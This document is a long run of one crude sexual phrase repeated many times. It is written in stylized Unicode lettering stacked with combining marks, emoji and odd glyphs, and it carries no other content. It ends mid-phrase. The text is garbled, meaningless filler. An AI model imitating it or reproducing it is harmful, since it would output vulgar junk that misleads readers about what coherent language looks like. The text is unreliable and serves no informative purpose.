𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 